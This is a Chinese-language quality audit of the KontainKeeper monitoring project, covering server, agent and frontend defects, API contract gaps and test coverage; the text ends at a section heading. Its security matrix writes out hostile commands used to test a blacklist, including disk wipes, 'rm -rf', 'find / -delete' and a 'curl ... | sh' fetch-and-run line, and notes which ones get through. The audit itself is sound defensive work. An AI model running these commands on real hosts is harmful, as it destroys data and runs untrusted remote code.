# KontainKeeper 全量质量评估报告（2026-10-29）

> 评估日期：**2026-10-29**　代码基线：`main` @ `0cfe06d`
> 范围：`server/src/kk_server/`（3,914 行）、`agent/src/kk_agent/`（2,267 行）、`web/src/`（14,712 行 / 123 文件）、`agent/tests` + `server/tests`（6,357 行）、门禁与仓库卫生。
> 方法：三路并行深审（服务端 / Agent / 前端）→ **高严重度条目由主线逐条读码复核 + 运行时复现**（§1 的黑名单矩阵、§3 的 PBKDF2 阻塞与聚合窗口均为实测或亲自读码，非转述）→ 基线全量复跑。
> 编号：本轮新缺陷用 `QR29-{S|A|W|G}` 前缀；命中既往账本（QR-、S-、P0-x/L1-x）的条目在「对账」列标注，避免重复计账。
> 交付性质：**评估**。分阶段优化方案见 `docs/remediation-plan-2026-10-29.md`（同日第二会话产出，含各阶段目标 / 文件 / 验收标准 / 回滚边界）。

---

## 复核记录（2026-10-29 第二会话，基线推进到 `fafd497`）

本报告发布后同一 worktree 又推进了 9 个提交（`0cfe06d → fafd497`，主要是并行会话的
Task 6/7 前端范式改造），随后本会话对**本轮要实施修复的条目做了逐条读码复核**，结论：

- **基线复测**：`pytest agent/tests server/tests -q` → **397 passed / 5 skipped / 0 failed，58.1s**
  （比首测多 5 条，为并行会话新增；无 Broker 环境，skip 仍是 Broker 级集成用例）。
- **并行会话影响**：`CommandHistory.vue` 已按审计页范式重写（数据流移至
  `command/components/utils/hook.tsx`），本文 §4 中 W3/W8/W12 的行号已漂移——但**结论全部仍然成立**：
  - W3：重写后的 `showOut`（hook.tsx:255-276）`out_purged` 分支仍在 `out.loading = true`
    之前 return，迟到包的 `finally` 仍因 `!isLatest()` 不复位 loading，永久转圈路径可达；
  - W8：`POLL_KEY = "command-history"`（hook.tsx:83）仍是硬编码常量，shell 与 collect
    两页共用同名 key 的机制没变；
  - W12：`CommandHistory` 自身已收口 `errText`，剩余内联点为 `collect/index.vue:47`、
    `HostPicker.vue:83`、`welcome/index.vue:154` 三处。
- **逐条复核确认**（本会话亲自读码，非转述）：S1、S2、S3、S4（协议 v4 的 status/hb 帧确有
  `host` 字段，proto/messages.md §3.1/§3.2）、S5、S7、S8、S9、S12、S13、S14、S15、S16、S18、
  W1、W2、W3、W4、W5、W7、W8、W9、W11、W12。
- **W2 范围修正**：不止 `uptime_sec`——详情页 `metrics?.sys?.os` 同样读的嵌套形状
  （`detail/index.vue:314`），而 Agent 的 `sys` 采集项经 `collect_items` 的 `out.update(part)`
  **平铺**进 metrics（`collector.py:196-204`：`os`/`kernel`/`arch`/`uptime_sec`/`boot_ts` 全平铺），
  两处都恒取不到，「系统」一行一直在走 `metrics.kernel` 兜底。
- **裁决点进展**：§7-1（并发写入）→ 并行会话已收尾到 Task 7，本会话规避其未跟踪 WIP
  （`host/update/*`、`api/agent.ts`）；§7-2（范围重心）→ 由本轮任务定性：P1/P2 缺陷修复 +
  双端测试补全 + AGENTS.md 测试门禁，**不做** store.py 拆分这类大手术（另列后期阶段）；
  §7-3/4/5 仍为产品/设计裁决，优化方案中只做「锁定现状语义」的回归测试，不擅自定口径。

---

## 0. 结论速览

**总体判定：B+。代码品质本身在涨，本轮把分数压住的是「门禁不存在」和「前端零测试」这两件一直没落地的事。**

| 维度 | 判定 | 一句话结论 |
|---|---|---|
| 结构与分层 | ⚠️ 服务端单点过载 | 层间方向干净（controller 不写 SQL、store 不发网络），但 `store.py` 已到 1,142 行必须拆的临界点；前端 6/7 业务页仍是 400+ 行 `<script setup>` 巨石 |
| 命名与可读性 | ✅ | 三处反直觉点（`raw_days` 单位、`metrics.sys` 形状、`MAX_ITEMS` 名不副实），其余克制；注释普遍解释「为什么」而非「做什么」 |
| 重复与冗余 | ⚠️ 前端为主 | 服务端仅 5 组 P3 级样板；前端同一件事写 6 遍（静默轮询 load / 防抖 / 导出 / argv 预览 / 在线标签 / 三态空态），只有审计页完成了下沉 |
| 错误与异常处理 | ⚠️ 两处可致命 | 桥接回调 catch 集合过窄（QR29-S2）；前端抽屉 loading 在分支上不复位，可永久卡死（QR29-W3） |
| 边界与空值 | ⚠️ 组合态是重灾区 | 单点防御意识很强（`_num`/`nOr`/`_clip`），漏的是「防御与另一条分支组合后失效」的态：NaN 穿透钳位、空机队谎报接口不可达、时钟超前令主机永在线 |
| 接口契约一致性 | ❌ 无机制保证 | 后端全部返回裸 dict、无 `response_model`；前端 TS 类型靠人工对齐，实测出 9 处字段级偏差（§5），其中 1 处导致界面恒显 `-` |
| 安全隐患 | ⚠️ 结构绕过已闭环，剩政策缺口 | `sh -x -c` 型绕过已修（实测 BLOCK）；余下是覆盖面（`curl \| sh`/`truncate`/`find -delete`/`systemctl`）与登出不吊销会话；黑名单+审计「不可绕过」红线**未被破坏** |
| 性能瓶颈 | ⚠️ 一条真阻塞 | 登录在协程里同步跑 310k PBKDF2，阻塞整个事件循环（QR29-S1，唯一能让「全绿的服务端」变瘫的单点）；其余是 N+1/全表扫随规模线性退化 |
| 测试覆盖 | ❌ 半边空白 | 后端 392 条绿（实测 58s），但 `hostinfo` 整模块、信号/退出路径、桥接异常逃逸零覆盖；**前端 0 个测试文件、无 vitest/playwright 依赖**——这是连续第四轮评估写下同一条结论 |
| 门禁可信度 | ❌ 不存在 | `core.hooksPath` 未设、`.git/hooks` 无生效钩子 → `web/.husky/pre-commit`（lint-staged）与 commitlint 是**死文件**；Python 侧无 ruff/mypy/pytest-cov，覆盖率是盲区而非低值 |

**可测量基线（本轮实测）**：`pytest agent/tests server/tests -q` → **392 passed / 5 skipped / 0 failed，58.14s**（无 Broker 环境，5 条为 Broker 级集成用例）；`web/` 前端 `pnpm typecheck` 绿、`0` 个测试文件、`strict:false`（tsconfig.json:6）、`no-explicit-any: off`（eslint.config.js:81）、94 处显式 `any`。

**一个必须点名的现场事实**：本次评估期间（02:22 / 02:26）另有一个会话在同一 worktree 连续提交 `docs/superpowers/plans/2026-10-28-frontend-layout-foundation.md` 的 Task 6（审计页范式改造）。该计划正在逐页重写 `web/src/views/*`，与本报告 §4/§6 的优化面**高度重叠**。并发写入是本报告落地前的第一风险，见 §7 裁决点 1。

---

## 1. 安全：红线复现矩阵（实测，非推断）

`is_blacklisted(argv, DEFAULT_BLACKLIST, use_shell)` 逐条真实调用结果：

| 载荷 | 结果 | 判读 |
|---|---|---|
| `sh -c "rm -rf /var/log"` | **BLOCK** | 基线形态正常 |
| `sh -x -c "wipefs -a /dev/sda"` | **BLOCK** | **QR-S25 已闭环**（旧版只认 `rest[0] == "-c"`，`security.py:77-99` 的 `_script_payload` 已跳过前导旗标） |
| `python -c 'import os;os.system("rm -rf /")'` | **BLOCK** | 解释器载荷走 `_DANGER_WORDS` 词边界扫描 |
| `dd if=/dev/zero of=/dev/sda` | **BLOCK** | 无条件拒绝程序名 |
| `curl http://x/s.sh \| sh` | **PASS** | 管道进 shell 不拦（`_SHELL_SPLIT` 拆开两段后，`curl` 与 `sh` 各自都不命中集合） |
| `truncate -s 0 /var/lib/kk/kk.db` | **PASS** | `truncate` 不在 `DANGEROUS_PROGS` |
| `find / -delete` | **PASS** | `find` + `-delete` 组合不在 `DANGEROUS_COMBOS` |
| `systemctl stop kk-agent` | **PASS** | Agent 可被自身命令通道停掉（自断链路，无告警） |
| `kill -9 1` | **PASS** | 打 init 不在覆盖面 |

结论分两层，别混：
- **结构性绕过**（上轮 QR-S25 / QR-P0-2 那一类「看起来在拦其实没在拦」）：**本轮复现不出来**，`_segments`/`_script_payload`/递归深度上限这套是有效的，`security.py:55` 的单竖线补齐也生效。
- **覆盖面缺口**（QR29-S6）：是**策略问题**而非代码缺陷——内网运维工具确实需要 `curl \| sh` 装东西、确实需要 `systemctl`。`DANGEROUS_PROGS`（security.py:27-34）缺 `kill/systemctl/truncate/unlink/shred`。补与不补都会牺牲一侧，必须产品裁决（§7 裁决点 3）。
- 真正的安全缺陷另在别处：**登出不吊销服务端会话**（QR29-W1）、**白名单内主机可互相污染状态**（QR29-S3）、**token 存 JS 可读 cookie 且从不校验过期**（QR29-W6）。

---

## 2. 服务端问题清单（`server/`）

优先级口径：**P0** = 现在就会造成数据错误或全网故障；**P1** = 一条真实路径可达的缺陷，需修；**P2** = 组合态/规模退化；**P3** = 工程卫生。

| ID | 级 | 位置 | 问题 | 影响范围 |
|---|---|---|---|---|
| QR29-S1 | **P1** | `models/store.py:940-955` + `models/helpers.py:10` | `verify_admin` 是 `async def`，但 `_pwdf` 里的 `hashlib.pbkdf2_hmac`（310k 迭代）是**同步 CPU 活**，未走 `asyncio.to_thread`；用户不存在时还刻意再跑一次同代价哈希（QR-S8 的反时序侧信道设计） | 单次登录占死事件循环数十毫秒；**MQTT 桥接的协程处理器跑在同一条循环上**（`services/mqtt_bridge.py:196` `_dispatch`），未鉴权的 `/api/login` 即可让心跳落库与命令下发停摆。登录限流 5 次/300s 只是把停摆变周期性 | 
| QR29-S2 | **P1** | `services/mqtt_bridge.py:172-176`、`191`、`203` | `_on_message` 的 catch 集合只有 `(ValueError, UnicodeDecodeError, IndexError)`；`self.stats[...] += 1`、`_dispatch` 里的 `call_soon_threadsafe`（循环已关闭时抛 `RuntimeError`）都在保护圈外 | paho 网络线程若在此抛出会被 paho 的异常策略处置（默认不吞），后果是**桥接静默停摆**——服务端 HTTP 一切正常、Agent 全部离线，最难的一类故障。需运行时确认 paho 版本行为，但「保护圈过窄」本身读码即可判定 |
| QR29-S3 | **P2** | `services/mqtt_bridge.py:188,192,200` | `stats` 计数器由 paho 线程与事件循环线程同时做 `+=` 读改写，无锁 | `rejected`（安全计数）会偏低，违背 AGENTS.md 自述的线程模型「网络线程只投递」。安全事件追溯时数字不可信 |
| QR29-S4 | **P2** | `services/mqtt_bridge.py:174,237,283` vs `341` | `result` 帧做了归属校验，`status`/`hb` 帧不校验 `body["host"]` 与 topic 主机一致（协议 messages.md 有该字段） | 白名单内任一主机可覆写他机的在线状态与指标。内网多租户（K8S 里多个 vscode-server 容器各跑一个 Agent）时是真越权 |
| QR29-S5 | **P2** | `models/store.py:316`、`354` vs `371-373` | `set_online` 直接采纳 Agent 自报 `ts` 写 `status_ts`，**没有** `record_hb` 那套 `now-86400 <= ts <= now+300` 钳制 | 时钟超前的主机令 `status_ts` 落在未来：`is_online`（:531）与 `mark_stale_offline`（:543）的判定式在负差值上恒为「在线」，retained 状态 + LWT 都被这个值影响 → **死机显示在线，且离线兜底永不生效** |
| QR29-S6 | **P2** | `security.py:27-34`、`55`、`67-69` | 覆盖面缺口，见 §1 矩阵 | 取决于 §7 裁决点 3 |
| QR29-S7 | **P2** | `controllers/auth.py:47-50` | `_reap` 只遍历 `_LOGIN_LOCKED_UNTIL`，`_LOGIN_FAILS` 里未达阈值的键永不回收——与函数 docstring「键无上限只增不减就是内存泄漏」的承诺相反 | 一次用户名枚举即可让字典无界增长；长跑进程内存缓涨，无重启点 |
| QR29-S8 | **P2** | `controllers/auth.py:63-65` | 锁定期内**每个请求**都 `store.add_audit(login_locked)`，未复用桥接侧的 `AUDIT_THROTTLE` 节流（`mqtt_bridge.py:215` `_audit_throttled`） | 未鉴权路径即可灌审计表（audit 只增不减，靠 cleanup 保留期兜），磁盘被打爆是可达的 |
| QR29-S9 | **P2** | `models/store.py:1017` vs `1065` | `_aggregate_hours` 的追赶窗口写成 `(raw_days + 1) * 3600`，把「天」当「小时」用；同一函数的清理侧用的是 `raw_days * 86400` | 服务端宕机 >3 小时后，那些小时被**永久跳过**（水位直接进到 `now-3h`），24h 以上的历史曲线不可回补。docstring 自己说「窗口要夹在保留期内」，夹错了单位 |
| QR29-S10 | **P2** | `models/store.py:1044`（hourly 聚合） | 每小时每主机写 2~4KB 的 `last_metrics` LONGTEXT，全仓无读取方（`controllers/containers.py:53` 读的是 `containers.last_metrics`，不是 `hourly`） | 纯写不读：90 天保留期下 GB 级无用容量 + 聚合期额外 IO。**待确认**是否二期要用，否则直接砍列与那次 N+1 |
| QR29-S11 | **P2** | `models/store.py:654-669`、`1136`、`1035-1046` | `batch_summary` 全表 GROUP BY 后内存排序（`batch_id` 无索引）、`counts()` 对 `heartbeats` 做 `COUNT(*)`、聚合每 pod 两次查询 | 都挂在轮询热点上，随保留期与机队规模**线性**退化。500 台/2 天量级尚可，千台级会先在这里出症状 |
| QR29-S12 | **P2** | `controllers/containers.py:114`（`view=full` 缺省 limit） | `view=full` 且 `limit` 缺省或 ≤0 时 SQL 不带 LIMIT | 全机队的 LONGTEXT 一次性进内存（admin 可触发），配合 §QR29-S11 是现成的自伤面 |
| QR29-S13 | **P2** | `models/tables.py:100,156` + `controllers/commands.py:92-133` | `argv`/`detail` 是 `Text`（MySQL 64KB 上限），`pods` 无数量上限；且审计写入发生在命令发布**之后** | 大批量下发时 detail 超限报 1406 → 命令已下发却返 500（部分写入，前端看不到台账）。AGENTS.md 明确写了 MySQL 大字段必须 LONGTEXT，这里是漏登记 |
| QR29-S14 | **P2** | `services/mqtt_bridge.py:485-489` vs `418-431` | `publish_update` 不看 ` MQTT` 发布的 `info.rc`（只有抛异常才算失败），而同文件的 `dispatch_command` 判 rc | 队列满/未连接时升级帧静默丢，台账卡 pending 30 分钟，`upgrade_pushed` 统计虚高。与「自更新窗口的离线语义（B6）」这套精细设计不自洽 |
| QR29-S15 | **P2** | `models/store.py:100` vs `controllers/containers.py:66` | 列表筛选按 raw `online` 列，渲染按 grace 集合 | `?online=true` 会返回含 `online:false` 的行，导出同口径错 → 「所见即所得」承诺在这一个筛选条件上不成立 |
| QR29-S16 | **P3** | `controllers/commands.py:26`（`MAX_ITEMS` 从未生效）、`store.py:359`（`Store.touch` 无调用）、`store.py:7,13`（未用 import）、`controllers/exporting.py:151`（`view` 参数被忽略） | 死代码与名不副实的常量 | 误导阅读；`MAX_ITEMS` 尤其危险——注释像是「有上限」，实际没有 |
| QR29-S17 | **P3** | `tables.py:183` / `containers.py:15` / `mqtt_bridge.py:51`（180 三处）；`containers.py:115`、`commands.py:158`、`audit.py:23`（`min(max(limit,…))` 三处）；`store.py:459,470,495,698`（400 分片四处）；`store.py:1088` vs `1105`（同构分批删） | 同一常量/样板散落多点 | 改一处忘两处；分批删那对可以合成一个函数 |
| QR29-S18 | **P3** | `store.py:613,901` vs `110` | 命令/审计的 keyword LIKE 未 `autoescape`，主机 keyword 有 | 搜 `100%` 语义反了，且可造慢扫描 |
| QR29-S19 | **P3** | 全部 controller | 无 `response_model`，返回裸 dict；`argv` 在列表是文本、单条是对象 | 契约漂移只能靠人工对齐（§5 的 9 处偏差就是这个机制缺位的账单） |

---

## 3. Agent 问题清单（`agent/`）

| ID | 级 | 位置 | 问题 | 影响范围 |
|---|---|---|---|---|
| QR29-A1 | **P1** | `agent/src/kk_agent/hostinfo.py:1-138`（整模块） | **全模块零单测**（`agent/tests` 无 `test_hostinfo`）：`_in_container`/`_cpuinfo_flags`/`_virt`/`_ips` 的 /proc、cgroup、os-release 解析全是 best-effort 字符串活且无验证；`host_env` 内部各探测未各自 `_safe`，靠调用方吞异常 | v4 status 帧的主机元信息（`env`/`group`/`caps` 依赖它）可能整体错报；容器判定回归无锁。这是「协议字段来自未测代码」的典型面 |
| QR29-A2 | **P1** | `main.py:255-263`、`272` | 信号处理（SIGTERM/SIGINT→stop）与启动 `wait_ready(timeout=10)` 全流程无测试：唯一的 `run` 用例预置 stop 立即退出，不触发心跳与更新调度 | 优雅退出帧（`publish_status(wait=True)`）是 B6 离线语义的一环，改坏了**静默失联**、无红灯 |
| QR29-A3 | **P1** | `transport.py:151`、`164-167`、`356-363` | `mqtt_username` 鉴权分支、mqtts 无 CA 的 `CERT_NONE` + `tls_insecure_set` 分支、`_on_message` 非 JSON/非 dict 忽略分支均未测 | 部署文档把 Broker 鉴权列为可选加固，加固路径本身无回归锁 |
| QR29-A4 | **P2** | `updater.py:260-272`、`383` | `download_binary` 把整个二进制读进 `bytearray`（上限 64MB）才落盘，`verify_and_replace` 再 `f.write(data)` 一次 | 更新期瞬时 RSS 远超 AGENTS.md 的 25–35MB 口径（12MB 包即 +12~24MB）；批量升级期在宿主机上叠加 |
| QR29-A5 | **P2** | `updater.py:423` + 无启动自检 | `execv` 成功即认为升级完成；新二进制若「版本对但启动即崩」，`.kkbak` 只在 `execv` 失败时回滚，退避账本随进程消失 | **升上去就砖**且无自愈：容器 supervisor 会反复拉起崩溃进程。属设计缺口，需确认是否补「启动后 N 秒健康门禁」 |
| QR29-A6 | **P2** | `plugin_loader.py:103-107` + `config.py:115` + `executor.py:39-46` | 插件热加载 = 未签名任意代码执行（Agent 常以 root 跑），`allow_shell` 默认开，黑名单只在服务端 | plugin_dir 若可写即 RCE。既定架构（内网灵活优先），但风险集中在此，属 §7 裁决点 3 范围 |
| QR29-A7 | **P3** | `collector.py:98-121` vs `124-144`；`updater.py:161-180` vs `260-272` | disk_io 与 net 的差分公式各写一遍、`_http_get` 与 `download_binary` 的流式封顶各写一遍 | 负速率钳制历史上就是两边各修一次；同类修复还会继续漏一边 |
| QR29-A8 | **P3** | `main.py:34-38,98,109,133,146,178,185`、`executor.py:225,235` | 结果字典 `{"rc","out","timed_out","elapsed_ms"}` 的构造散落 8+ 处 | 帧形漂移风险；协议契约里这些字段是必须的 |
| QR29-A9 | **P3** | `executor.py:20` | `executor` 反向 `from .transport import RC_SEND_FAILED` | 分层倒置（执行层不该知道传输层常量），常量该下沉到独立模块 |
| QR29-A10 | **P3** | `transport.py:283`、`main.py:272,290`、`executor.py:142,73` | `wait_for_publish(1.0)`、`stop.wait(0.5)`、`reader.join(2)`、`p.wait(3/5)` 等超时魔法数未命名 | 可读性与调参；AGENTS.md 里「心跳下限 1s」这类口径全靠人记 |
| QR29-A11 | **P3** | `updater.py:55-58`、`347-348`；`executor.py:148`；`config.py:59` vs `17` | `_in_backoff` 定义了无人调用（退避判定在 receipt 里手写）；`len(buf) > max_out` 恒为 False 的死分支；`topic_prefix` 未做与 `host` 同级的通配符校验 | 死代码 + 误导注释（「RLock 为 _in_backoff 复用」已失效）；前缀含 `+/#` 可致误订阅 |

---

## 4. 前端问题清单（`web/`）

| ID | 级 | 位置 | 问题 | 影响范围 |
|---|---|---|---|---|
| QR29-W1 | **P1** | `store/modules/user.ts:80-88`（注释自述「前端登出（不调用接口）」）+ `api/user.ts`（无 logout 函数）+ 后端 `controllers/auth.py:97` 已实现 `/api/logout` | 登出只清本地，**不吊销服务端会话** | 会话 TTL 12h（`store.py:957`）内 token 一直可用。公用机器/浏览器留存/XSS 拿到 token 后等同仍在登录。后端能力现成，前端没接 |
| QR29-W2 | **P1** | `views/host/detail/index.vue:333-334`（读 `metrics?.sys?.uptime_sec`）vs `agent/collector.py:196-204` + `collect_items` 的 `out.update(part)`（:270）+ `agent/tests/test_collector.py:259`（断言顶层 `uptime_sec`） | 前端按「嵌套 `sys`」形状读，Agent 实际**平铺**输出；同页 `:328` 的 `disk_read_mb` 又按平铺读 | 「运行时长」在详情页**恒显示 `-`**（真缺陷，非样式）。两种形状混用说明类型层没有任何机制能抓住它——正是 `strict:false` + `no-explicit-any: off` 的组合账单 |
| QR29-W3 | **P1** | `views/command/components/CommandHistory.vue:201-221` | `showOut` 里 `out_purged` 分支在 `out.loading = true` **之前** return；另一条迟到包的 `finally` 因 `!isLatest()` 不复位 loading | 先点未清理行（请求在途）、再点已清理行 → 抽屉 `<pre v-loading>` **永久转圈**，只能关掉重开。可达路径明确，是「防盖界面」与「分支 return」组合出的经典死态 |
| QR29-W4 | **P2** | `views/command/components/HostPicker.vue:32`（`listRead = !!props.hosts?.length \|\| read`） | 父页传空数组与「接口挂了」同形（`command/shell:48`、`command/collect:45` 失败时 hosts 保持 `[]`） | 机队真的 0 台时，抽屉显示「没读到（主机清单不可达）」——**恰好违反该文件自己注释的 QR-W16 红线**，也与 `views/system` 的三态读数是两套口径 |
| QR29-W5 | **P2** | `views/host/monitor/index.vue:387` `fillPct`（`Math.round(v ?? 0)`）+ `utils/kk.ts:36` `numText`；对照 `server/models/helpers.py:43 _num` | NaN 直通：`Math.min(100, NaN) = NaN`，钳位形同不存在；后端 `_num` 也不过 NaN/Inf | 与函数注释「坏值不画出越界的条」相反，界面直接渲染 `NaN`。插件写坏指标即可触发 |
| QR29-W6 | **P2** | `utils/auth.ts:56,61,77-85` + `router/index.ts:149` | token/refreshToken 存 JS 可读 cookie 与 localStorage（无 `Secure`），`expires` 写了但从不校验；路由守卫只看 cookie 存不存在，不调 `/api/me` | XSS 可整串取走且 12h 有效（叠加 QR29-W1 无法吊销）；守卫放行后靠每个请求 401 兜，是「假鉴权」体验 |
| QR29-W7 | **P2** | `utils/http/index.ts:107-108` | 401 直接 `logOut()`，无在途去重、无「会话已过期」提示 | 6 路轮询同时 401 → `logOut()`/`resetRouter()` 连打数次，用户被静默弹回登录页且不知原因 |
| QR29-W8 | **P2** | `utils/kkPoll.ts:51` + `CommandHistory.vue:41` | `setPoll` 先按 key 全局 `clearPoll`，而 key 是硬编码 `POLL_KEY` 常量，`CommandHistory` 又被 shell 页与 collect 页共用 | 轮询 key 是全局命名空间：任一处重名就**静默掐掉别的组件的轮询**（AGENTS.md 已警告过模块级全局的坑，这里是它的孪生形态） |
| QR29-W9 | **P2** | `views/command/shell/index.vue:56-69` | `watch(() => ({...shellForm}), …, {deep: true})`：getter 依赖 `cmdline`，而 Vue 3.5 下 `deep` 使 `hasChanged` 短路 | 命令框每敲一个字符触发一次 `router.replace` + 面包屑/tags 重算，而 `cmdline` 并不落 URL → 纯浪费 + 输入卡顿感 |
| QR29-W10 | **P2** | `api/user.ts:47` | 前端硬编码 `12 * 3600 * 1000` 有效期，真相同源在服务端 `store.py:957 ttl=12*3600` | 服务端调 TTL 后本地过期时间与真实会话不符（提前掉线或谎称有效）。契约又一处靠注释维持 |
| QR29-W11 | **P2** | `utils/kk.ts:49-50` `errText` | 声明返回 `string`，实际可把 FastAPI 422 的 `detail: [{loc,msg,type}]` 原样返回 | 校验类错误时 toast 变「加载失败：[object Object]」，用户看到的最常见一条错误是乱码 |
| QR29-W12 | **P3** | `collect:47`、`CommandHistory:98`、`HostPicker:83`、`welcome:154` | 四处内联 `e?.message ?? e`，绕过 `errText` | 后端 `detail` 文案丢失，同一系统两种错误措辞 |
| QR29-W13 | **P3** | `monitor:469` + `:236`（模板 `@change="restartTimer"` 与 `watch(interval)` 并存）；对照 `update` 页已裁决「只留 watch」 | 一次改间隔重建两次定时器，且已定形的修法没回灌总览页 | 双份定时器，行为不报错但白做 |
| QR29-W14 | **P3** | `monitor:471-474` / `update:318-322` / `system:316-319` | 间隔下拉三页三样（档位、文案「停止」vs「停止刷新」、尺寸写法） | 交互不一致；档位常量三处各写 |
| QR29-W15 | **P3** | `monitor:639`（列 `prop="last_seen"` 但 summary 视图不返回）、`monitor:689`/`CommandHistory:446`（`el-pagination` 用已弃用的 `small`）、`api/commands.ts:107`/`api/user.ts:71`/`store/modules/user.ts:90`（`getCommand`/`refreshTokenApi`/`handRefreshToken` 无调用点，后者恒 reject） | 空 prop 列靠自定义 header 掩盖、EP 升级即静默失效、死代码误导 | 既往账本 P0-x/L1-x 已收过同类，说明缺少**回归机制**而不是缺少发现 |
| QR29-W16 | **P3** | `views/host/detail/index.vue:357` | 前端硬编码磁盘告警阈值 85，服务端真相在 `models/store.py:80 DISK_ALERT_PCT` | 「筛出来的」与「标红的」可能分家；调阈值要改两处 |
| QR29-W17 | **P3** | 全仓 grep 无 `visibilitychange` | `monitor`/`welcome`/`CommandHistory` 的轮询在 `document.hidden` 时继续打后端 | 挂着总览页不放 = 常驻 10s/3s 轮询。是否接受要产品口径（§7 裁决点 4） |

---

## 5. 前后端契约偏差清单（字段级）

后端零 `response_model`（QR29-S19）的直接账单。左列全部经读码定位，`/api/*` 为服务端真实返回 vs 前端 TS 建模：

| 接口 | 前端位置 | 后端位置 | 偏差 | 后果 |
|---|---|---|---|---|
| `GET /api/containers/{pod}` | `api/containers.ts:57-74` | `controllers/containers.py:69` | 后端回 `status_reason`，`HostDetail` 未建模 | 详情页（`:246-252`）只显在线/离线，**自更新窗口（B6 的 `reason=updating`）在详情页不可见**，列表页有 |
| `GET /api/containers/{pod}` | `api/containers.ts:69,72` | `containers.py:71,73` | `custom`、`labels` 后端回、前端建模，但**七个页面零渲染** | v4 新增的主机元信息在 UI 上等于不存在，协议投入换不到可见性 |
| `GET /api/containers` | `api/containers.ts:14-26` | `containers.py:43-46` | `caps`/`docker_*` 建模 + 传输，页面未用（`docker_unhealthy` 连筛选入口都刻意关在 `monitor:82-84`） | 同上；且服务端 `caps` 门禁本身「还没写」（`tables.py:59-62` 自述）——**上报了但两端都不消费** |
| `GET /api/containers` | `api/containers.ts:47-54` | `containers.py:137` | 后端顶层回 `latest_agent_ver`，前端未建模 | 页面改用每行字段凑出来的，全局口径丢了 |
| `GET /api/containers/{pod}/metrics` | `api/containers.ts:86`（`source`） | `containers.py:159` | `source: "raw"/"hourly"` 建模但从不读取 | 7 天曲线其实是小时聚合这一事实对用户不可见（会误读精度） |
| `GET /api/system/updates` | `api/agent.ts:50-58` | `models/tables.py:138-149` | 后端多回 `finished_at`，前端未建模也不显示 | 升级耗时不可见，版本页看不出「慢在哪」 |
| `GET /api/audit`、`/api/export/audit` | `api/audit.ts:20-26`、`api/exporting.ts:25-30` | `controllers/audit.py:13` | `actor`/`action` 双端都有实现但**无 UI 入口**，审计页只有 keyword | 安全事件检索只能靠全文关键字，按人/按动作筛选缺失 |
| `POST /api/commands` | `views/command/shell/index.vue:94`（`body as any`） | `controllers/commands.py:29-36` | `as any` 绕开 `CommandCreateBody` 收窄 | `kind`/`argv`/`items` 的非法组合类型检查抓不到，只能靠后端 4xx 兜 |
| `GET /api/me`、`POST /api/logout` | 无（`api/user.ts` 全文没这两个绑定） | `controllers/auth.py:97,114` | 后端两个端点前端完全没接 | QR29-W1 的成因；`/api/me` 未接也令守卫只能做假鉴权（QR29-W6） |

---

## 6. 结构、重复与测试覆盖

### 6.1 分层判断（只说结论与边界）

- **服务端**：层间依赖方向干净（controller 不写 SQL、store 不发网络、service 不依赖 controller），三库方言单点收敛这套**是对的，别在重构中打散**。唯一越界是 `controllers/commands.py:178` import 了 store 的私有函数。
- **`store.py` 1,142 行的自然拆分边界**（按现有内聚分组，无需重设计）：`hosts`（set_online/record_hb/在线判定/列表筛选）、`metrics`（series/hourly/聚合水位）、`commands`（下发/回执/批次/tail 读取）、`audit`、`auth`（admins/sessions）、`kv+cleanup`。它已经有 `helpers.py` 的先例，继续同风格切即可，不必引入新架构。
- **前端**：`api/` 层是干净的薄封装（值得肯定），问题在视图层——`hook.tsx` + `PureTableBar` 的下沉范式**只有审计页完成**，其余 6 页各自持有 load/防抖/分页/导出/空态的私有实现。

### 6.2 应优先收敛的重复组（前端为主，服务端 5 组 P3）

1. **静默轮询 load 骨架（6 份）**：`monitor:207-229`、`detail:140-170`、`update:88-124`、`system:231-267`、`welcome:117-158`、`CommandHistory:78-103` → `usePolledLoad()`，把 `beginSeq + loading + pollFailed + read + finally(isLatest)` 一次写死。审计页的 `hook.tsx` 已是正确方向，只差这半边。
2. **关键字防抖 300ms（3 份）**：`monitor:140-152`、`CommandHistory:135-149`、`audit/utils/hook.tsx:108-118` → `useDebounce()`，与 `usePolls` 同作用域生命周期。
3. **分页换算 + 越界钳位**：`monitor:123-128,159-165`、`CommandHistory:169-174`（无钳位）→ `usePagination()`，把审计页已定的「单一状态源」反向推给这两页。
4. **导出+下载样板（4 份）**：`monitor:246-258`、`detail:180-192`、`CommandHistory:237-252`、`hook.tsx:126-140` → `useExport()`。
5. **argv 预览（3 套语义）**：`CommandHistory:254-265`、`welcome:165-180`、后端 `exporting.py:116-128` → `utils/kk.ts` 的 `argvText()`，`items` 前缀文案统一（现在一个叫 `items:` 一个叫 `采集项:`）。
6. **主机选取**：`loadHosts`（`shell:46`、`collect:43`、`HostPicker:73`）+ `picked`（三处）→ `useHostSelection()`，`HostPicker` 不再懒加载第二份。
7. **在线标签（4 份）与三态空态（6 份）与轮询读数条（5 份）** → `KkHostState` / `KkEmpty` / `KkSyncReadout` 三个小组件；`nowSec()`（三处内联）进 `utils/kk.ts`。
8. **常量**：`DEFAULT_ITEMS`（2 处）、阈值 85 / 30-120-600、间隔档位（3 处）→ 单一常量模块。

### 6.3 测试覆盖现状

| 面 | 现状 | 缺口 |
|---|---|---|
| 后端 | 392 条实测绿，方言/桥接路由/治理有回归锁，docstring 写「为什么」是同类仓库少见的 | `upload_agent` 的 413 与 version 校验（`agent_update.py:54,65`）；`/api/me`（`auth.py:115`）；hb/status 时间戳越界钳制；`_on_message` 异常逃逸与 loop 已关闭路径；`_aggregate_hours` 长宕机追赶（QR29-S9 正是无人测才跑错单位）；`hostinfo` 整模块；Agent 信号/退出路径；`transport` 的鉴权与 TLS 分支 |
| 后端可信度 | `test_dialects` 只 **compile 不执行**：1406 超限、负 OFFSET、MySQL TEXT 截断这些**真库行为**未被验证 | 无 pytest-cov → 覆盖率是盲区（不是低值，是未知） |
| 集成 | 5 条依赖真实 Broker，无 Broker 即 skip（本轮基线正是 5 skipped） | 「全 passed」与「skip 了 5 条」在 CI 里不可区分，见 §6.4 |
| 前端 | **0 个测试文件、无 vitest/playwright 依赖、无测试配置** | 连续第四轮评估写下同一条结论。§4 的 17 条里**没有一条**能被现有机制抓住：`strict:false` + `no-explicit-any: off`（94 处 `any`）意味着类型层也放弃了 |

### 6.4 门禁可信度（本轮最大的结构性缺口）

